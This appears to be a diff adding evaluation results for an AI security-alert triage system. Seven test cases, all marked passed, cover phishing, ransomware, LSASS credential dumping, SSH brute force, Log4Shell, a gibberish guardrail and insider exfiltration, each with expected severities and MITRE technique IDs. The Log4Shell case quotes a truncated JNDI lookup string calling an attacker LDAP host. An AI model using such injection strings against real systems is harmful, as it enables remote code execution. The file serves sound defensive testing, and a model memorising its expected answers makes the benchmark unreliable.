@@ -1,0 +1,162 @@
+[
+  {
+    "id": "T1_phishing_credential_entry",
+    "alert_excerpt": "User reported email from ceo@anthrop1c.com (note typo) requesting urgent wire transfer to new vendor",
+    "severity": "critical",
+    "confidence": "high",
+    "escalate": true,
+    "techniques": [
+      "T1566",
+      "T1566.002"
+    ],
+    "retrieval_score": 0.418,
+    "sources": [
+      "insider_threat.md",
+      "phishing_indicators.md"
+    ],
+    "passed": true,
+    "checks": {
+      "severity_match": true,
+      "escalate_match": true,
+      "techniques_match": true,
+      "retrieval_score_ok": true
+    },
+    "latency_seconds": 8.53
+  },
+  {
+    "id": "T2_ransomware_active",
+    "alert_excerpt": "Multiple file servers showing thousands of file modifications per minute. Files renamed with .lockbi",
+    "severity": "critical",
+    "confidence": "high",
+    "escalate": true,
+    "techniques": [
+      "T1486",
+      "T1490"
+    ],
+    "retrieval_score": 0.541,
+    "sources": [
+      "ransomware_indicators.md"
+    ],
+    "passed": true,
+    "checks": {
+      "severity_match": true,
+      "escalate_match": true,
+      "techniques_match": true,
+      "retrieval_score_ok": true
+    },
+    "latency_seconds": 8.09
+  },
+  {
+    "id": "T3_credential_dumping_lsass",
+    "alert_excerpt": "EDR detected suspicious access to LSASS process memory by rundll32.exe with comsvcs.dll on workstati",
+    "severity": "critical",
+    "confidence": "high",
+    "escalate": true,
+    "techniques": [
+      "T1003",
+      "T1003.001"
+    ],
+    "retrieval_score": 0.488,
+    "sources": [
+      "mitre_execution_persistence.md",
+      "mitre_credential_access_lateral.md",
+      "log_analysis_windows.md"
+    ],
+    "passed": true,
+    "checks": {
+      "severity_match": true,
+      "escalate_match": true,
+      "techniques_match": true,
+      "retrieval_score_ok": true
+    },
+    "latency_seconds": 7.66
+  },
+  {
+    "id": "T4_brute_force_ssh",
+    "alert_excerpt": "5000 failed SSH authentication attempts in last 10 minutes against host srv-bastion-01 from source I",
+    "severity": "high",
+    "confidence": "high",
+    "escalate": true,
+    "techniques": [
+      "T1110"
+    ],
+    "retrieval_score": 0.501,
+    "sources": [
+      "mitre_credential_access_lateral.md",
+      "log_analysis_linux.md"
+    ],
+    "passed": true,
+    "checks": {
+      "severity_match": true,
+      "escalate_match": true,
+      "techniques_match": true,
+      "retrieval_score_ok": true
+    },
+    "latency_seconds": 7.22
+  },
+  {
+    "id": "T5_log4shell_unverified_patch_claim",
+    "alert_excerpt": "WAF detected JNDI string in HTTP User-Agent header to internal Java application: jndi:ldap://attacke",
+    "severity": "high",
+    "confidence": "high",
+    "escalate": true,
+    "techniques": [
+      "T1190"
+    ],
+    "retrieval_score": 0.44,
+    "sources": [
+      "cve_critical_2023_2024.md"
+    ],
+    "passed": true,
+    "checks": {
+      "severity_match": true,
+      "escalate_match": true,
+      "techniques_match": true,
+      "retrieval_score_ok": true
+    },
+    "latency_seconds": 8.81
+  },
+  {
+    "id": "T6_gibberish_guardrail",
+    "alert_excerpt": "asdfqwerzxcv 1234567890 lorem ipsum dolor sit amet",
+    "severity": "informational",
+    "confidence": "high",
+    "escalate": false,
+    "techniques": [],
+    "retrieval_score": 0.247,
+    "sources": [
+      "cve_critical_2023_2024.md",
+      "log_analysis_windows.md"
+    ],
+    "passed": true,
+    "checks": {
+      "severity_match": true,
+      "escalate_match": true,
+      "retrieval_score_ok": true
+    },
+    "latency_seconds": 5.67
+  },
+  {
+    "id": "T7_insider_exfil_departing",
+    "alert_excerpt": "Employee jdoe (resignation notice given last week) downloaded 15GB of customer data from CRM in last",
+    "severity": "critical",
+    "confidence": "high",
+    "escalate": true,
+    "techniques": [
+      "T1078",
+      "T1567",
+      "T1114"
+    ],
+    "retrieval_score": 0.397,
+    "sources": [
+      "insider_threat.md"
+    ],
+    "passed": true,
+    "checks": {
+      "severity_match": true,
+      "escalate_match": true,
+      "retrieval_score_ok": true
+    },
+    "latency_seconds": 9.18
+  }
+]
